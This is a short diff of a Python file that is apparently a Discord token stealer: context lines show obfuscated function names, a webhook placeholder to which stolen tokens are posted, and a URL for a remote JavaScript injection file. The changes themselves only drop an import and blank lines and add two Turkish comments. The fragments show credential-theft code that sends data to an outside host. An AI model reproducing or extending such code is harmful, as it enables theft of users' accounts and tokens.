@@ -19,11 +19,6 @@ import shutil
 import uuid
 import socket
 import getpass
-import ctypes
-
-
-
-
 
 
 
@@ -58,7 +53,7 @@ wh00k = "WEBHOOK HERE"
 inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
     
 DETECTED = False
-
+#bir ucaktik dustuk bir gemiydik battik :(
 def g3t1p():
     ip = "None"
     try:
@@ -434,7 +429,7 @@ def upl05dT4k31(t0k3n, path):
         }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
 
-
+#hersey son defa :(
 def R4f0rm3t(listt):
     e = re.findall("(\w+[a-z])",listt)
     while "https" in e: e.remove("https")
